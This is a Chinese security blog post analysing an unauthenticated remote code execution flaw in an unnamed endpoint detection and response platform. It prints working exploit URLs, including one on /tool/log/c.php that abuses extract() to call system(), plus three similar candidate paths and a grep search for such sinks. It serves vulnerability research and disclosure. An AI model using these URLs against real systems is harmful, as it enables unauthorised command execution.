<!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1" /> <title>某终端检测响应平台代码审计分析 · Chen's Blog</title> <meta name="description" content="某终端检测响应平台代码审计分析"> <meta name="keywords" content="某终端检测响应平台代码审计分析"> <link rel="icon" href="http://localhost:4000/assets/favicon.png"> <link rel="apple-touch-icon" href="http://localhost:4000/assets/touch-icon.png"> <link rel="stylesheet" href="http://localhost:4000/assets/core.css"> <link rel="canonical" href="http://localhost:4000/archives/2020-09-03/2"> <link rel="alternate" type="application/atom+xml" title="Chen's Blog" href="http://localhost:4000/feed.xml" /> <link href="/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" media="all" /> <script> var _hmt = _hmt || []; (function() { var hm = document.createElement("script"); hm.src = "https://hm.baidu.com/hm.js?e4a42a371cc5994ee02b940034c29658"; var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s); })(); </script> </head> <body> <aside class="logo"> <a href="http://localhost:4000/"> <img src="/assets/avatar.jpg" class="logo-avatar"> </a> <span class="logo-prompt code">Back to Index</span> </aside> <article> <h1 class="title">EvilChen</h1> <div class="divider"></div> <center> <a href="https://github.com/gh0stkey" target="_blank">Github</a> | <a href="https://twitter.com/VulkeyChen" target="_blank">X (Twitter)</a> | <a href="/about" target="_blank">About</a> | <a href="/friends" target="_blank">Friends</a> </center> <div class="divider"></div> </article> <div id="content"> <article> <div class="center"> <h1 class="title">某终端检测响应平台代码审计分析</h1> <time class="code">September 3, 2020</time> </div> <div class="divider"></div> <h1 id="某终端检测响应平台代码审计分析">某终端检测响应平台代码审计分析</h1> <h2 id="前言">前言</h2> <p>2020年08月17日收到一条漏洞情报，某终端检测响应平台代码未授权RCE：<code class="language-plaintext highlighter-rouge">/tool/log/c.php?strip_slashes=system&amp;host=id</code></p> <p><img src="/images/2020-09-03/15977354683614.jpg" alt="-w1120" /></p> <p>参数：<strong>host</strong>，可以修改任意的系统命令进行执行。</p> <h2 id="原理分析">原理分析</h2> <p>首先我们跟进一下<strong>/tool/log/c.php</strong>文件发现其没有任何权限限制，所以我们只需要看一下请求参数是如何传递的，搜索关键词：</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$_POST</span>
<span class="nv">$_GET</span>
<span class="nv">$_REQUEST</span>
</code></pre></div></div> <p>在代码第144行、146行分别调用了<strong>变量匿名函数</strong>，并将<code class="language-plaintext highlighter-rouge">$_REQUEST</code>作为传递参数：</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$show_form</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">);</span>
<span class="o">...</span>
<span class="nv">$main</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">);</span>
</code></pre></div></div> <p>先跟进<strong>$show_form</strong>这个匿名函数：</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$show_form</span> <span class="o">=</span> <span class="k">function</span><span class="p">(</span><span class="nv">$params</span><span class="p">)</span> <span class="nx">use</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$strip_slashes</span><span class="p">,</span> <span class="o">&amp;</span><span class="nv">$show_input</span><span class="p">)</span> <span class="p">{</span>
    <span class="nb">extract</span><span class="p">(</span><span class="nv">$params</span><span class="p">);</span>
    <span class="nv">$host</span>  <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$host</span><span class="p">)</span>  <span class="o">?</span> <span class="nv">$strip_slashes</span><span class="p">(</span><span class="nv">$host</span><span class="p">)</span>  <span class="o">:</span> <span class="s2">"127.0.0.1"</span><span class="p">;</span>
    <span class="nv">$path</span>  <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span>  <span class="o">?</span> <span class="nv">$strip_slashes</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span>  <span class="o">:</span> <span class="s2">""</span><span class="p">;</span>
    <span class="nv">$row</span>   <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$row</span><span class="p">)</span>   <span class="o">?</span> <span class="nv">$strip_slashes</span><span class="p">(</span><span class="nv">$row</span><span class="p">)</span>   <span class="o">:</span> <span class="s2">""</span><span class="p">;</span>
    <span class="nv">$limit</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$limit</span><span class="p">)</span> <span class="o">?</span> <span class="nv">$strip_slashes</span><span class="p">(</span><span class="nv">$limit</span><span class="p">)</span> <span class="o">:</span> <span class="mi">1000</span><span class="p">;</span>
    
    <span class="c1">// 绘制表单</span>
    <span class="k">echo</span> <span class="s2">"&lt;pre&gt;"</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s1">'&lt;form id="studio" name="studio" method="post" action=""&gt;'</span><span class="p">;</span>
    <span class="nv">$show_input</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">"title"</span> <span class="o">=&gt;</span> <span class="s2">"Host "</span><span class="p">,</span>  <span class="s2">"name"</span> <span class="o">=&gt;</span> <span class="s2">"host"</span><span class="p">,</span>  <span class="s2">"value"</span> <span class="o">=&gt;</span> <span class="nv">$host</span><span class="p">,</span>  <span class="s2">"note"</span> <span class="o">=&gt;</span> <span class="s2">" - host, e.g. 127.0.0.1"</span><span class="p">));</span>
    <span class="nv">$show_input</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">"title"</span> <span class="o">=&gt;</span> <span class="s2">"Path "</span><span class="p">,</span>  <span class="s2">"name"</span> <span class="o">=&gt;</span> <span class="s2">"path"</span><span class="p">,</span>  <span class="s2">"value"</span> <span class="o">=&gt;</span> <span class="nv">$path</span><span class="p">,</span>  <span class="s2">"note"</span> <span class="o">=&gt;</span> <span class="s2">" - path regex, e.g. mapreduce"</span><span class="p">));</span>
    <span class="nv">$show_input</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">"title"</span> <span class="o">=&gt;</span> <span class="s2">"Row  "</span><span class="p">,</span>  <span class="s2">"name"</span> <span class="o">=&gt;</span> <span class="s2">"row"</span><span class="p">,</span>   <span class="s2">"value"</span> <span class="o">=&gt;</span> <span class="nv">$row</span><span class="p">,</span>   <span class="s2">"note"</span> <span class="o">=&gt;</span> <span class="s2">" - row regex, e.g. \s[w|e]\s"</span><span class="p">));</span>
    <span class="nv">$show_input</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">"title"</span> <span class="o">=&gt;</span> <span class="s2">"Limit"</span><span class="p">,</span>  <span class="s2">"name"</span> <span class="o">=&gt;</span> <span class="s2">"limit"</span><span class="p">,</span> <span class="s2">"value"</span> <span class="o">=&gt;</span> <span class="nv">$limit</span><span class="p">,</span> <span class="s2">"note"</span> <span class="o">=&gt;</span> <span class="s2">" - top n, e.g. 100"</span><span class="p">));</span>
    <span class="k">echo</span> <span class="s1">'&lt;input type="submit" id="button"&gt;'</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s1">'&lt;/form&gt;'</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">"&lt;/pre&gt;"</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div></div> <p>变量匿名函数 <strong>$show_form</strong> 具有一个形式参数 <strong>$params</strong> 在这里也就是<code class="language-plaintext highlighter-rouge">array("strip_slashes"=&gt;"system","host"=&gt;"id");</code></p> <p>接下来执行<strong>extract($params);</strong>，后进入如下代码：</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$host</span>  <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$host</span><span class="p">)</span>  <span class="o">?</span> <span class="nv">$strip_slashes</span><span class="p">(</span><span class="nv">$host</span><span class="p">)</span>  <span class="o">:</span> <span class="s2">"127.0.0.1"</span><span class="p">;</span>
</code></pre></div></div> <p>在这个过程中就产生了漏洞，想要了解具体原因，我们需要了解<strong>extract</strong>函数的作用，该函数是根据数组的<code class="language-plaintext highlighter-rouge">key=&gt;value</code>创建变量<code class="language-plaintext highlighter-rouge">$key=value</code>（官方解释：<strong>extract — Import variables into the current symbol table from an array</strong>）</p> <p>知道其函数作用之后，我们就大致明白漏洞原因了。</p> <p>首先函数传入参数值为<code class="language-plaintext highlighter-rouge">array("strip_slashes"=&gt;"system","host"=&gt;"id");</code></p> <p>经过<strong>extract()</strong>函数后，赋值了2个变量：</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$strip_slashes</span> <span class="o">=</span> <span class="s1">'system'</span><span class="p">;</span>
<span class="nv">$host</span> <span class="o">=</span> <span class="s1">'id'</span><span class="p">;</span>
</code></pre></div></div> <p>在第91行代码，变量<strong>$host</strong>利用三元运算重新赋值<strong>$strip_slashes($host)</strong></p> <p>而实际上其赋值内容是函数<code class="language-plaintext highlighter-rouge">system('id')</code>的返回结果，这也就造成了命令执行漏洞。</p> <h2 id="同类漏洞寻找">同类漏洞寻找</h2> <p>首先在全局文件中搜索<code class="language-plaintext highlighter-rouge">$_GET、$_POST、$_REQUEST</code>和<code class="language-plaintext highlighter-rouge">extract(</code>，其次在这些文件中使用正则寻找变量函数传递变量：<code class="language-plaintext highlighter-rouge">\$[a-zA-Z0-9_]*\(\$[a-zA-Z0-9_]*\)</code></p> <p>Linux grep寻找命令：</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">grep</span> <span class="nt">-E</span> <span class="s2">"</span><span class="se">\$</span><span class="s2">_GET|</span><span class="se">\$</span><span class="s2">_POST|</span><span class="se">\$</span><span class="s2">_REQUEST"</span> <span class="nb">.</span> <span class="nt">-r</span> <span class="nt">--include</span> <span class="se">\*</span>.php <span class="nt">-v</span> | <span class="nb">grep</span> <span class="s2">"extract("</span> <span class="nt">-v</span> | <span class="nb">grep</span> <span class="nt">-E</span> <span class="s2">"</span><span class="se">\\\$</span><span class="s2">[a-zA-Z0-9_]*</span><span class="se">\(\\\$</span><span class="s2">[a-zA-Z0-9_]*</span><span class="se">\)</span><span class="s2">"</span>
</code></pre></div></div> <p>简单分析获得了另外三处RCE：</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/tool/php_cli.php?strip_slashes=system&amp;code=id
/tool/ldb_cli.php?strip_slashes=system&amp;json=id
/tool/mdd_sql.php?strip_slashes=system&amp;root=id
</code></pre></div></div> <p>但无法真正利用，三处文件开头都有一个类似文件存活的判断，不存在代码则<strong>die</strong>退出，而默认环境上是存在：</p> <p><img src="/images/2020-09-03/15977415061102.jpg" alt="-w568" /></p> <h2 id="最后">最后</h2> <p>该套程序还有诸多漏洞未被披露出来，建议采用ACL控制访问或下线该业务，等待官方升级补丁。</p> </article> <div class="page-navigation code"> <a class="next" href="http://localhost:4000/archives/2020-09-03/3" title="NEXT: 某终端检测响应平台代码审计挖掘（权限绕过）">&lt;&lt;</a> <span> &middot; </span> <a class="home" href="http://localhost:4000/" title="Back to Index">INDEX</a> <span> &middot; </span> <a class="prev" href="http://localhost:4000/archives/2020-09-03/1" title="PREV: 浅谈蓝队反制手段">&gt;&gt;</a> </div> </div> <div class="footer"> <span class="block">&lt;/&gt; Copyright &copy; Chen's Blog (GH0ST.CN) 2016-2021</span> </div> <script src="/fancybox/lib/jquery-1.10.2.min.js"></script> <script type="text/javascript" src="/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script> <script> $(document).ready(function() { $("article img").each(function() { var strA = "<a style='text-decoration: none;' id='imgid' href='" + this.src + "'></a>"; $(this).wrapAll(strA); }); $(".block").html("&lt;/&gt; Copyright &copy; Chen's Blog (GH0ST.CN) 2016-" + (new Date()).getFullYear()); }); $("#imgid").fancybox({ openEffect : 'elastic', closeEffect : 'elastic', }); </script> </body> </html>
